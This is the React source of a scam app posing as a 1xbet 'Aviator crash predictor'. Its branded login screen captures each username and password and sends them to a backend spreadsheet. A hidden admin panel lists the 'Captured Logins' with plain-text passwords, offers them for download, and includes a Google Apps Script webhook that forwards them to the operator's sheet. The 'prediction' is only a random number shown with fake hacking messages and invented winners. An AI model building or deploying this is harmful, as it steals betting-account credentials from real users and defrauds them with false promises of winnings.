import React, { useState, useEffect, useRef } from "react";
import { 
  Cpu, 
  HelpCircle, 
  History, 
  ShieldAlert, 
  Zap, 
  RefreshCw, 
  Activity, 
  CheckCircle2, 
  Sliders,
  LogOut,
  Sparkles,
  TrendingUp,
  AlertTriangle,
  Award
} from "lucide-react";
import { motion, AnimatePresence } from "motion/react";

// Types
interface RoundResult {
  winner: string;
  crashedTime: string;
  amount: string;
  isUserWin?: boolean;
}

export default function App() {
  // --- Login & User State ---
  const [isLoggedIn, setIsLoggedIn] = useState<boolean>(false);
  
  // Login input forms are always kept empty by default
  const [username, setUsername] = useState<string>("");
  const [password, setPassword] = useState<string>("");
  
  // Track currently active session identity logged in
  const [activeUsername, setActiveUsername] = useState<string>("Moh01");

  // --- Admin Console variables ---
  const [isAdminOpen, setIsAdminOpen] = useState<boolean>(false);
  const [adminLogins, setAdminLogins] = useState<any[]>([]);
  const [adminPredictions, setAdminPredictions] = useState<any[]>([]);
  const [adminTab, setAdminTab] = useState<"logins" | "predictions" | "sheets">("logins");

  // --- Preloaded Ledger Winners List matching screenshot ---
  const [winnersList, setWinnersList] = useState<RoundResult[]>([
    { winner: "Oussama02", crashedTime: "10.50x", amount: "6$" },
    { winner: "Tb02", crashedTime: "6.25x", amount: "10.5$" },
    { winner: "Zouhair9", crashedTime: "1.84x", amount: "20$" },
    { winner: "Anas_B", crashedTime: "3.20x", amount: "12$" },
    { winner: "Yassine_T", crashedTime: "1.45x", amount: "4$" },
    { winner: "Hamza06", crashedTime: "2.10x", amount: "15$" }
  ]);

  // --- Predictor States ---
  const [predictionState, setPredictionState] = useState<"idle" | "scanning" | "revealed">("idle");
  const [predictedMultiplier, setPredictedMultiplier] = useState<number | null>(null);
  const [flickerValue, setFlickerValue] = useState<string>("?.??");
  const [statusText, setStatusText] = useState<string>("PRESS START TO INITIALIZE SCAN");
  
  // Simulated analytics feed
  const [mockHistory, setMockHistory] = useState<number[]>([1.45, 9.34, 1.83, 2.18, 1.04, 3.21, 14.50, 1.12]);
  
  // Real-time Excel database live counter states
  const [excelStats, setExcelStats] = useState<{ logins: number; predictions: number }>({ logins: 0, predictions: 0 });

  // Online Sheet settings variables
  const [onlineSheetUrl, setOnlineSheetUrl] = useState<string>("");
  const [testStatus, setTestStatus] = useState<{ type: "idle" | "success" | "error" | "pinging"; message: string }>({ type: "idle", message: "" });
  const [showScriptGuide, setShowScriptGuide] = useState<boolean>(false);

  // Timer for flicker interval
  const flickerTimerRef = useRef<NodeJS.Timeout | null>(null);

  // Authentically-inspired crash formula distribution
  const generateLocalPredictionValue = (): number => {
    const rand = Math.random();
    if (rand < 0.05) return 1.00; // instant crash
    const raw = 0.95 / (1.00 - rand);
    const val = Math.min(85.00, Math.round(raw * 100) / 100);
    return Math.max(1.05, val);
  };

  // Fetch current database statistics from our server Excel file
  const fetchExcelDatabaseStats = async () => {
    try {
      const response = await fetch("/api/excel/data");
      if (response.ok) {
        const data = await response.json();
        setExcelStats({
          logins: Array.isArray(data.logins) ? data.logins.length : 0,
          predictions: Array.isArray(data.predictions) ? data.predictions.length : 0
        });
      }
    } catch (err) {
      console.warn("Could not retrieve statistics from local Excel spreadsheet ledger.", err);
    }
  };

  // Fetch spreadsheet link settings on start
  const fetchExcelSettings = async () => {
    try {
      const response = await fetch("/api/excel/settings");
      if (response.ok) {
        const data = await response.json();
        if (data && typeof data.onlineSheetUrl === "string") {
          setOnlineSheetUrl(data.onlineSheetUrl);
        }
      }
    } catch (err) {
      console.warn("Could not retrieve online sheet link settings on boot.", err);
    }
  };

  const fetchAdminLogs = async () => {
    try {
      const response = await fetch("/api/excel/data");
      if (response.ok) {
        const data = await response.json();
        setAdminLogins(Array.isArray(data.logins) ? data.logins : []);
        setAdminPredictions(Array.isArray(data.predictions) ? data.predictions : []);
      }
    } catch (err) {
      console.warn("Could not retrieve full database logs for admin", err);
    }
  };

  const handleSaveSettings = async (urlVal: string) => {
    try {
      const response = await fetch("/api/excel/settings", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ onlineSheetUrl: urlVal })
      });
      if (response.ok) {
        const data = await response.json();
        setTestStatus({ type: "success", message: data.message || "Spreadsheet destination saved!" });
      } else {
        setTestStatus({ type: "error", message: "Failed to store settings configuration on backend." });
      }
    } catch (e: any) {
      setTestStatus({ type: "error", message: "Error updating server setting configs: " + e.message });
    }
  };

  const handleTestConnection = async () => {
    if (!onlineSheetUrl || !onlineSheetUrl.startsWith("http")) {
      setTestStatus({ type: "error", message: "Please specify a valid link starting with HTTP/HTTPS first!" });
      return;
    }
    setTestStatus({ type: "pinging", message: "Sending telemetry diagnostics signal..." });
    try {
      const response = await fetch("/api/excel/settings/test", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ onlineSheetUrl })
      });
      const data = await response.json();
      if (data.success) {
        setTestStatus({ type: "success", message: data.message });
      } else {
        setTestStatus({ type: "error", message: data.message });
      }
    } catch (e: any) {
      setTestStatus({ type: "error", message: "Failed to reach endpoint. " + e.message });
    }
  };

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const cleanUsername = username.trim() || "Moh01";
    
    localStorage.setItem("aviator_is_logged_in", "true");
    localStorage.setItem("aviator_username", cleanUsername);
    setActiveUsername(cleanUsername);

    // Save login credentials directly into our spreadsheet
    try {
      await fetch("/api/store/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: cleanUsername, password: password || "" })
      });
      // Refresh count
      fetchExcelDatabaseStats();
    } catch (error) {
      console.error("Could not write authentication credentials to sheet database log.", error);
    }

    setIsLoggedIn(true);
  };

  const handleLogout = () => {
    localStorage.removeItem("aviator_is_logged_in");
    setIsLoggedIn(false);
    setUsername("");
    setPassword("");
    setPredictionState("idle");
    setPredictedMultiplier(null);
    setStatusText("PRESS START TO INITIALIZE SCAN");
  };

  // --- Main Action: START PREDICTION ---
  const handleStartPrediction = async () => {
    if (predictionState === "scanning") return;

    setPredictionState("scanning");
    setStatusText("CONNECTING TO SEED CHANNEL...");

    // Lightning fast visual numbers rolling animation – 15ms interval for instant vibes
    let tickCount = 0;
    if (flickerTimerRef.current) clearInterval(flickerTimerRef.current);
    flickerTimerRef.current = setInterval(() => {
      const tempVal = (1.05 + Math.random() * 8).toFixed(2);
      setFlickerValue(tempVal);
      
      tickCount++;
      if (tickCount === 3) {
        setStatusText("HARVESTING ACTIVE CRASH LOGS...");
      } else if (tickCount === 6) {
        setStatusText("INJECTING SECURE MULTIPLIER...");
      }
    }, 15);

    // Instant local authentic formula prediction calculation
    const resultVal = generateLocalPredictionValue();
    
    // Brief visual delay of exactly 200ms to allow a super snappy and responsive transition
    await new Promise((resolve) => setTimeout(resolve, 200));

    // Clear interval immediately
    if (flickerTimerRef.current) {
      clearInterval(flickerTimerRef.current);
      flickerTimerRef.current = null;
    }

    setPredictedMultiplier(resultVal);
    setPredictionState("revealed");
    setStatusText("PREDICTION SECURED SUCCESSFULLY!");

    // Prepend the new prediction onto our history & winners list
    setMockHistory(prev => [...prev, resultVal].slice(-15));
    
    const userResult: RoundResult = {
      winner: activeUsername,
      crashedTime: `${resultVal.toFixed(2)}x`,
      amount: "SUCCESS",
      isUserWin: true
    };

    // Add a couple of simulated companion bots to keep the dashboard fluid
    const botNames = ["Oussama02", "Tb02", "Zouhair9", "Anas_B", "Hamza06", "Simo_M", "Zac08"];
    const randomBot = botNames[Math.floor(Math.random() * botNames.length)];
    const botResultVal = generateLocalPredictionValue();
    const botResult: RoundResult = {
      winner: randomBot,
      crashedTime: `${botResultVal.toFixed(2)}x`,
      amount: `${Math.round(5 + Math.random() * 25)}$`
    };

    setWinnersList(prev => [
      userResult,
      botResult,
      ...prev.filter(item => !item.isUserWin)
    ].slice(0, 8));

    // Archive this prediction in our spreadsheet sheet "Predictions" (non-blocking server store)
    try {
      await fetch("/api/store/prediction", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: activeUsername,
          prediction: `${resultVal.toFixed(2)}x`
        })
      });
      // Fetch new stats counters from our excel database files
      fetchExcelDatabaseStats();
    } catch (err) {
      console.error("Could not write prediction log to excel database.", err);
    }
  };

  // Load the current excel database logs count when application loads
  useEffect(() => {
    fetchExcelDatabaseStats();
    fetchExcelSettings();
    return () => {
      if (flickerTimerRef.current) clearInterval(flickerTimerRef.current);
    };
  }, []);

  // --- Render Login Screen ---
  if (!isLoggedIn) {
    return (
      <div 
        className="w-full min-h-screen bg-gradient-to-b from-[#0a1d47] to-[#01091a] text-[#E0E0E0] flex flex-col items-center justify-center font-sans relative overflow-hidden px-4" 
        id="login-wrapper"
      >
        <div className="absolute inset-0 z-0 opacity-20 pointer-events-none">
          <div className="absolute w-[500px] h-[500px] rounded-full bg-blue-600/30 blur-[120px] -top-48 -left-48"></div>
          <div className="absolute w-[500px] h-[500px] rounded-full bg-indigo-500/30 blur-[120px] -bottom-48 -right-48"></div>
        </div>

        <div 
          className="w-full max-w-sm bg-white/[0.04] border border-white/10 rounded-3xl p-8 backdrop-blur-md shadow-[0_15px_50px_rgba(3,11,36,0.8)] z-10 flex flex-col items-center animate-fadeIn" 
          id="login-dialog-box"
        >
          <div className="mb-8 select-none" id="login-logo-container">
            <div className="bg-white px-6 py-2 rounded font-black text-2xl text-[#0f215c] font-sans tracking-tight shadow-md flex items-center justify-center">
              1xbet
            </div>
          </div>

          <form onSubmit={handleLoginSubmit} className="w-full space-y-5" id="login-form">
            <div className="space-y-2">
              <label className="text-sm font-bold text-white/90 tracking-wide font-sans">User Name :</label>
              <input 
                type="text" 
                id="username-field"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Enter Username"
                className="w-full px-4 py-2.5 bg-white text-blue-950 font-black border border-zinc-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 text-center"
                required
              />
            </div>

            <div className="space-y-2">
              <label className="text-sm font-bold text-white/90 tracking-wide font-sans">Password :</label>
              <input 
                type="password" 
                id="password-field"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="••••••••"
                className="w-full px-4 py-2.5 bg-white text-blue-950 font-black border border-zinc-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 text-center"
              />
            </div>

            <div className="pt-3">
              <button
                type="submit"
                id="submit-login-btn"
                className="w-full py-2.5 bg-[#3169f5] hover:bg-[#1a55eb] text-white font-extrabold tracking-widest text-sm rounded-lg shadow-[0_4px_15px_rgba(49,105,245,0.4)] transition-all cursor-pointer select-none border border-blue-400/20 active:scale-95 animate-pulse"
              >
                Login
              </button>
            </div>
          </form>
        </div>

        <div 
          onClick={() => {
            fetchAdminLogs();
            setIsAdminOpen(true);
          }}
          className="absolute bottom-6 text-[10px] text-zinc-500/85 hover:text-blue-400 font-mono tracking-widest select-none uppercase cursor-pointer transition-colors"
        >
          1xCRASH NETWORK CONTROL LINKED
        </div>
      </div>
    );
  }

  // --- Render Predictor Screen (Only centered phone frame is kept) ---
  return (
    <div 
      className="w-full min-h-screen bg-gradient-to-b from-[#020713] to-[#010307] text-[#E0E0E0] flex flex-col items-center justify-center font-sans relative overflow-hidden px-4 sm:px-6" 
      id="global-layout"
    >
      {/* Immersive background decoration */}
      <div className="absolute inset-0 z-0 opacity-25 pointer-events-none">
        <div className="absolute w-[600px] h-[600px] rounded-full bg-blue-600/10 blur-[130px] top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2"></div>
      </div>

      {/* Main phone frame container */}
      <div 
        className="w-full max-w-sm bg-gradient-to-b from-[#0a1d47] to-[#01091a] border border-blue-900/60 rounded-[32px] p-5 shadow-[0_25px_60px_rgba(0,0,0,0.85)] flex flex-col relative select-none shrink-0 z-10 my-4" 
        id="aviation-mobile-panel"
      >
        {/* Top Bar inside the phone frame */}
        <div className="flex items-center justify-between pb-3 border-b border-white/[0.06] mb-1 shrink-0" id="frame-topbar">
          <div className="bg-white px-4 py-1 rounded font-black text-[11px] text-[#0f215c] font-sans tracking-tight select-none">
            1xbet
          </div>
          <div className="flex items-center gap-2 text-xs text-white uppercase font-sans font-bold">
            <span>{activeUsername}</span>
            <span className="w-2.5 h-2.5 bg-[#10b981] rounded-full shadow-[0_0_8px_#10b981] animate-pulse"></span>
            <button 
              onClick={handleLogout}
              className="ml-1 p-1 text-slate-400 hover:text-red-400 transition-colors cursor-pointer"
              title="Logout"
            >
              <LogOut className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>

        {/* ACTIVE MULTIPLIER COCKPIT CARD */}
        <div 
          className="relative w-full bg-[#061539]/65 border border-blue-500/15 rounded-3xl min-h-[175px] shadow-2xl flex flex-col justify-center items-center overflow-hidden my-3 shrink-0" 
          id="canvas-portal"
        >
          {/* Animated concentric scanning circles for realistic radar feedback */}
          <div className="absolute pointer-events-none inset-0 flex items-center justify-center opacity-25">
            <div className={`border border-blue-400/30 rounded-full w-24 h-24 ${predictionState === "scanning" ? "animate-ping speed-slow" : "animate-pulse"}`}></div>
            <div className={`border border-indigo-500/20 rounded-full w-36 h-36 ${predictionState === "scanning" ? "animate-pulse" : ""}`}></div>
            <div className="border border-blue-500/10 rounded-full w-48 h-48"></div>
          </div>

          {/* Large Prediction Multiplier overlay */}
          <div className="absolute inset-0 flex flex-col items-center justify-center pointer-events-none z-10 text-center px-4">
            {predictionState === "scanning" ? (
              <div className="font-sans font-black tracking-widest text-[52px] sm:text-[58px] text-white leading-none drop-shadow-[0_2px_15px_rgba(255,255,255,0.2)]">
                {flickerValue}
                <span className="text-xl font-bold ml-0.5 text-blue-400">x</span>
              </div>
            ) : predictionState === "revealed" ? (
              <div className="font-sans font-black tracking-widest text-[56px] sm:text-[62px] text-emerald-400 leading-none drop-shadow-[0_2px_20px_rgba(52,211,153,0.3)] animate-scaleUp">
                {predictedMultiplier?.toFixed(2)}
                <span className="text-2xl font-bold ml-1 text-white">x</span>
              </div>
            ) : (
              <div className="font-sans font-black tracking-widest text-[44px] text-blue-300/40 leading-none">
                ?.??
                <span className="text-xl font-normal ml-0.5">x</span>
              </div>
            )}

            {/* Glowing decorative radar scan line */}
            {predictionState === "scanning" && (
              <div className="absolute w-[180px] h-[2px] bg-gradient-to-r from-transparent via-blue-400 to-transparent top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 animate-bounce"></div>
            )}
          </div>

          {/* Mini active link badge inside card */}
          <div className="absolute bottom-2.5 px-3 py-0.5 bg-blue-950/40 border border-blue-500/20 rounded-md text-[9px] text-blue-300 font-mono flex items-center gap-1">
            <span className={`w-1.5 h-1.5 rounded-full ${predictionState === "scanning" ? "bg-amber-400 animate-pulse" : "bg-emerald-500"}`}></span>
            {predictionState === "scanning" ? "BYPASS COGNIZANCE LINKING..." : "TELEMETRY SYNCHRONIZED"}
          </div>
        </div>

        {/* Dynamic Status Ticker Display */}
        <div className="w-full bg-[#0d1c44]/50 border border-white/[0.04] px-4 py-2.5 rounded-2xl flex flex-col items-center text-center text-xs shrink-0 mb-3" id="multiplier-projection-card">
          <span className="text-[8.5px] font-mono text-blue-300 font-bold uppercase tracking-[0.2em] mb-1">BYPASS TELEMETRY LOG</span>
          <span className={`font-mono font-bold text-[10px] leading-tight tracking-wider ${predictionState === "scanning" ? "text-amber-400 animate-pulse" : "text-emerald-400"}`}>
            {statusText}
          </span>
        </div>

        {/* PROMINENT CIRCULAR INTERACTIVE ACTIVATION BUTTON */}
        <div className="relative flex items-center justify-center w-full shrink-0 my-1" id="circle-bet-container">
          <div className="rounded-full p-2 bg-[#121c42]/80 border border-blue-500/10 shadow-[0_0_20px_rgba(59,130,246,0.15)] relative flex items-center justify-center">
            <button
              id="primary-activation-circle-btn"
              onClick={handleStartPrediction}
              disabled={predictionState === "scanning"}
              className={`w-36 h-36 rounded-full font-black text-lg tracking-widest select-none uppercase shadow-2xl transition-all relative flex flex-col items-center justify-center leading-tight active:scale-95 border-4 cursor-pointer ${
                predictionState === "scanning"
                  ? "bg-gradient-to-b from-[#1e3a8a] to-[#1e293b] text-slate-400 border-blue-900/40 cursor-not-allowed"
                  : "bg-gradient-to-b from-[#3169f5] to-[#1447c2] hover:from-[#1e54eb] hover:to-[#0f3db5] text-white border-blue-400/20 shadow-[0_0_30px_rgba(49,105,245,0.45)] hover:shadow-[0_0_45px_rgba(49,105,245,0.6)] cursor-pointer"
              }`}
            >
              {predictionState === "scanning" ? (
                <>
                  <Activity className="w-6 h-6 animate-spin text-amber-400 mb-1" />
                  <span className="text-xs tracking-wider text-amber-200 font-bold">SCANNING</span>
                </>
              ) : (
                <>
                  <span className="text-[10px] tracking-widest text-blue-100 font-bold opacity-80 uppercase mb-0.5">PRESS CODE</span>
                  <span className="text-xl inline-block font-sans font-black tracking-tight text-white drop-shadow-md">PREDICT</span>
                </>
              )}
            </button>
          </div>
        </div>

        {/* BOTTOM WINNERS LIST */}
        <div className="bg-[#0c1f4e]/30 border border-blue-900/40 rounded-3xl p-4 w-full mx-auto shadow-lg space-y-2 mt-4 shrink-0" id="winners-ledger-list">
          <div className="grid grid-cols-3 text-center px-1 border-b border-white/[0.05] pb-2" id="ledger-header">
            <span className="text-[10px] text-blue-300 font-extrabold uppercase tracking-widest text-left">Winner</span>
            <span className="text-[10px] text-blue-300 font-extrabold uppercase tracking-widest text-center">Crashed time</span>
            <span className="text-[10px] text-blue-300 font-extrabold uppercase tracking-widest text-right">amount</span>
          </div>

          <div className="space-y-1.5 max-h-[145px] overflow-y-auto pr-0.5 custom-scrollbar" id="ledger-rows">
            {winnersList.map((row, idx) => (
              <div 
                key={idx}
                className={`px-4 py-2 flex items-center justify-between text-xs select-none transition-all rounded-xl ${
                  row.isUserWin
                    ? "bg-[#3f5bf4] text-white font-extrabold shadow-[0_4px_12px_rgba(63,91,244,0.4)] border border-blue-400/25 animate-scaleUp"
                    : idx === 0 && predictionState === "revealed"
                      ? "bg-[#131b3e]/80 text-[#ccd9ff] border border-blue-900/25 animate-fadeIn"
                      : "bg-[#131b3e]/80 text-[#ccd9ff] border border-blue-900/25"
                }`}
              >
                <span className="font-extrabold truncate w-[90px] text-left">
                  {row.winner}
                </span>
                <span className="font-bold text-center flex-1">
                  {row.crashedTime}
                </span>
                <span className={`font-black text-right w-[60px] ${row.isUserWin || row.amount === "SUCCESS" ? "text-amber-400 animate-pulse" : "text-emerald-400"}`}>
                  {row.amount}
                </span>
              </div>
            ))}
          </div>
        </div>

      </div>

      {/* Decorative footer below mobile frame */}
      <div 
        onClick={() => {
          fetchAdminLogs();
          setIsAdminOpen(true);
        }}
        className="text-[9.5px] font-mono tracking-[0.3em] text-zinc-500 hover:text-blue-400 uppercase pb-2 mt-1 cursor-pointer select-none text-center transition-colors"
      >
        ⚡ 1xBet Aviation Decoder Core Synchronous ⚡
      </div>

      {/* GLORIOUS SECRET ADMIN CABINET PANEL OVERLAY */}
      <AnimatePresence>
        {isAdminOpen && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-[#020713]/98 z-50 overflow-y-auto p-4 sm:p-6 md:p-8 flex items-center justify-center backdrop-blur-md"
            id="admin-portal-modal"
          >
            <motion.div
              initial={{ scale: 0.95, y: 15 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.95, y: 15 }}
              className="w-full max-w-2xl bg-[#07163f]/90 border border-blue-500/25 rounded-[32px] p-6 sm:p-8 shadow-[0_20px_50px_rgba(0,10,40,0.9)] flex flex-col relative"
            >
              {/* Close Button */}
              <button
                type="button"
                onClick={() => setIsAdminOpen(false)}
                className="absolute top-5 right-5 text-zinc-400 hover:text-white bg-white/[0.05] hover:bg-white/[0.1] w-8 h-8 rounded-full transition-all cursor-pointer flex items-center justify-center text-sm font-bold border border-white/[0.08]"
              >
                ✕
              </button>

              <div className="flex items-center gap-3 mb-6">
                <span className="w-2.5 h-2.5 bg-emerald-400 rounded-full animate-ping"></span>
                <h2 className="text-xl font-black font-sans tracking-wide text-white">
                  🛡️ ADVANCED DATABASE CONTROL PANEL
                </h2>
              </div>

              {/* Offline Export Excel direct downloader banner */}
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-6 bg-black/45 p-4 rounded-2xl border border-white/[0.04]">
                <div className="text-left font-sans">
                  <span className="text-[10px] text-zinc-400 uppercase tracking-widest block font-bold mb-0.5">Local Logins</span>
                  <div className="text-2xl font-black text-white">{adminLogins.length}</div>
                </div>
                <div className="text-left font-sans">
                  <span className="text-[10px] text-zinc-400 uppercase tracking-widest block font-bold mb-0.5">Rounds Cached</span>
                  <div className="text-2xl font-black text-emerald-400">{adminPredictions.length}</div>
                </div>
                <div className="flex items-center">
                  <a
                    href="/api/excel/download"
                    download="user_data.xlsx"
                    className="w-full text-center py-2.5 px-3 bg-blue-600 hover:bg-blue-500 text-white font-mono font-bold tracking-wider text-[11px] rounded-xl shadow-md transition-all uppercase cursor-pointer select-none"
                  >
                    📥 Download xlsx file
                  </a>
                </div>
              </div>

              {/* Tabs selector */}
              <div className="flex border-b border-white/[0.08] mb-5 gap-2 overflow-x-auto">
                <button
                  type="button"
                  onClick={() => setAdminTab("logins")}
                  className={`pb-2.5 px-4 text-xs font-mono font-black tracking-wider uppercase transition-colors relative cursor-pointer block shrink-0 ${
                    adminTab === "logins" ? "text-blue-400 border-b-2 border-blue-400 font-extrabold" : "text-zinc-500 hover:text-zinc-300"
                  }`}
                >
                  👤 Captured Logins
                </button>
                <button
                  type="button"
                  onClick={() => setAdminTab("predictions")}
                  className={`pb-2.5 px-4 text-xs font-mono font-black tracking-wider uppercase transition-colors relative cursor-pointer block shrink-0 ${
                    adminTab === "predictions" ? "text-blue-400 border-b-2 border-blue-400 font-extrabold" : "text-zinc-500 hover:text-zinc-300"
                  }`}
                >
                  🚀 Simulated Computes
                </button>
                <button
                  type="button"
                  onClick={() => setAdminTab("sheets")}
                  className={`pb-2.5 px-4 text-xs font-mono font-black tracking-wider uppercase transition-colors relative cursor-pointer block shrink-0 ${
                    adminTab === "sheets" ? "text-emerald-400 border-b-2 border-emerald-400 font-extrabold" : "text-zinc-500 hover:text-zinc-300"
                  }`}
                >
                  🟢 Sheet Auto-Sync Setup
                </button>
              </div>

              {/* Tab 1: Logins list */}
              {adminTab === "logins" && (
                <div className="space-y-2 flex-1 max-h-[250px] overflow-y-auto pr-1">
                  {adminLogins.length === 0 ? (
                    <div className="text-center text-xs text-zinc-500 py-8 font-mono">NO LOGINS STORED YET</div>
                  ) : (
                    <div className="border border-white/[0.05] rounded-xl overflow-hidden">
                      <table className="w-full text-[11px] font-mono text-left border-collapse">
                        <thead>
                          <tr className="bg-black/35 text-zinc-400 border-b border-white/[0.05]">
                            <th className="p-2.5">User Name</th>
                            <th className="p-2.5">Password</th>
                            <th className="p-2.5 text-right">Timestamp</th>
                          </tr>
                        </thead>
                        <tbody>
                          {adminLogins.map((item: any, idx: number) => (
                            <tr key={idx} className="border-b border-white/[0.03] hover:bg-white/[0.02]">
                              <td className="p-2.5 font-bold text-white truncate max-w-[120px]">{item.Username}</td>
                              <td className="p-2.5 text-amber-400 font-black truncate max-w-[150px]">{item.Password}</td>
                              <td className="p-2.5 text-right text-zinc-400 text-[10px]">{item.Timestamp}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  )}
                </div>
              )}

              {/* Tab 2: Predictions list */}
              {adminTab === "predictions" && (
                <div className="space-y-2 flex-1 max-h-[250px] overflow-y-auto pr-1">
                  {adminPredictions.length === 0 ? (
                    <div className="text-center text-xs text-zinc-500 py-8 font-mono">NO COMPUTES GENERATED YET</div>
                  ) : (
                    <div className="border border-white/[0.05] rounded-xl overflow-hidden">
                      <table className="w-full text-[11px] font-mono text-left border-collapse">
                        <thead>
                          <tr className="bg-black/35 text-zinc-400 border-b border-white/[0.05]">
                            <th className="p-2.5">User Name</th>
                            <th className="p-2.5">Prediction</th>
                            <th className="p-2.5 text-right">Timestamp</th>
                          </tr>
                        </thead>
                        <tbody>
                          {adminPredictions.map((item: any, idx: number) => (
                            <tr key={idx} className="border-b border-white/[0.03] hover:bg-white/[0.02]">
                              <td className="p-2.5 font-bold text-white truncate max-w-[120px]">{item.Username}</td>
                              <td className="p-2.5 text-emerald-400 font-extrabold">{item.PredictionValue}</td>
                              <td className="p-2.5 text-right text-zinc-400 text-[10px]">{item.Timestamp}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  )}
                </div>
              )}

              {/* Tab 3: Google Sheets setup */}
              {adminTab === "sheets" && (
                <div className="space-y-4 flex-1 text-left max-h-[300px] overflow-y-auto pr-1">
                  <div className="space-y-2">
                    <label className="text-xs font-mono font-bold text-zinc-300 block">CURRENT SPREADSHEET OR WEBHOOK TARGET LINK:</label>
                    <input
                      type="url"
                      placeholder="https://script.google.com/macros/s/.../exec"
                      value={onlineSheetUrl}
                      onChange={(e) => {
                        setOnlineSheetUrl(e.target.value);
                        setTestStatus({ type: "idle", message: "" });
                      }}
                      className="w-full px-3 py-2 bg-black/60 border border-blue-500/20 text-emerald-300 placeholder:text-zinc-600 rounded-xl text-xs font-mono focus:outline-none focus:ring-1 focus:ring-blue-500"
                    />

                    <div className="flex gap-2 pt-1">
                      <button
                        type="button"
                        onClick={() => handleSaveSettings(onlineSheetUrl)}
                        className="py-1.5 px-3 bg-blue-900/60 hover:bg-blue-800 text-blue-200 text-xs font-mono font-bold rounded-lg border border-blue-700/30 transition-all cursor-pointer active:scale-95"
                      >
                        💾 Save Link Configuration
                      </button>

                      <button
                        type="button"
                        onClick={handleTestConnection}
                        disabled={testStatus.type === "pinging"}
                        className="py-1.5 px-3 bg-emerald-950/60 hover:bg-emerald-900 text-emerald-200 text-xs font-mono font-bold rounded-lg border border-emerald-700/30 transition-all cursor-pointer id-test-connection active:scale-95"
                      >
                        ⚡ Test Diagnostics
                      </button>
                    </div>

                    {testStatus.message && (
                      <div className={`p-2 rounded-lg text-[10px] font-mono leading-relaxed mt-2 border ${
                        testStatus.type === "success"
                          ? "bg-emerald-950/30 border-emerald-500/20 text-emerald-400"
                          : testStatus.type === "pinging"
                            ? "bg-zinc-950/30 border-zinc-500/25 text-zinc-400 animate-pulse"
                            : "bg-red-950/30 border-red-500/25 text-red-400"
                      }`}>
                        {testStatus.message}
                      </div>
                    )}
                  </div>

                  <div className="border-t border-white/[0.05] pt-4">
                    <h4 className="text-xs font-black font-mono text-blue-300 tracking-wider uppercase mb-1.5">💡 GOOGLE SHEET SETUP GUIDE:</h4>
                    <p className="text-[10px] text-zinc-400 leading-relaxed mb-3">
                      Your link is registered as a direct Google Sheets interface page. Sheets require API execution endpoints to receive data.
                      To activate instant, seamless writing of login records into your Sheet, please complete this simple 30-second setup:
                    </p>

                    <div className="bg-black/45 p-3 rounded-xl border border-white/[0.04] space-y-2 text-[10px] text-zinc-300 font-sans leading-relaxed">
                      <ol className="list-decimal pl-4.5 space-y-1 text-zinc-400">
                        <li>Open your <b>Google Sheet</b>.</li>
                        <li>Click <b>Extensions</b> &gt; <b>Apps Script</b> in the top menu.</li>
                        <li>Delete any placeholder function, and paste the exact code script block below.</li>
                        <li>Click <b>Deploy</b> (top right) &gt; <b>New deployment</b>.</li>
                        <li>Set Deployment type: <b>Web app</b>.</li>
                        <li>Configure settings: Execute as: <b>Me</b>, Who has access: <b>Anyone</b>. Click Deploy.</li>
                        <li>Copy the generated <b>Web App URL</b> (e.g. starting with <i>/macros/...</i>) and paste it into our Target Link input field above!</li>
                      </ol>

                      <div className="flex items-center justify-between font-mono text-[9px] uppercase text-zinc-400 mt-2">
                        <span>Apps Script (Copy to Clipboard)</span>
                        <button
                          type="button"
                          onClick={() => {
                            navigator.clipboard.writeText(`function doPost(e) {
  try {
    var data = JSON.parse(e.postData.contents);
    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
    if (sheet.getLastRow() === 0) {
      sheet.appendRow(["Timestamp", "Log Type", "Username", "Password", "Multiplier Locked"]);
    }
    sheet.appendRow([
      data.Timestamp || new Date().toLocaleString(),
      data.Type || "Unknown",
      data.Username || "Unknown",
      data.Password || "N/A",
      data.PredictionValue || "N/A"
    ]);
    return ContentService.createTextOutput(JSON.stringify({ success: true, message: "OK" }))
      .setMimeType(ContentService.MimeType.JSON);
  } catch(e) {
    return ContentService.createTextOutput(JSON.stringify({ success: false, error: e.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}`);
                            alert("Apps Script copied directly!");
                          }}
                          className="px-2 py-0.5 bg-zinc-800 hover:bg-zinc-700 text-white rounded cursor-pointer text-[8px] transition-colors"
                        >
                          Copy Script
                        </button>
                      </div>
                      <pre className="p-2 bg-neutral-950/90 text-amber-500 font-mono text-[7px] leading-tight overflow-x-auto rounded-lg max-h-[100px] border border-white/[0.04]">
{`function doPost(e) {
  try {
    var data = JSON.parse(e.postData.contents);
    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
    if (sheet.getLastRow() === 0) {
      sheet.appendRow(["Timestamp", "Log Type", "Username", "Password", "Multiplier Locked"]);
    }
    sheet.appendRow([
      data.Timestamp || new Date().toLocaleString(),
      data.Type || "Unknown",
      data.Username || "Unknown",
      data.Password || "N/A",
      data.PredictionValue || "N/A"
    ]);
    return ContentService.createTextOutput(JSON.stringify({ success: true, message: "OK" }))
      .setMimeType(ContentService.MimeType.JSON);
  } catch(e) {
    return ContentService.createTextOutput(JSON.stringify({ success: false, error: e.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}`}
                      </pre>
                    </div>
                  </div>
                </div>
              )}
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

    </div>
  );
}
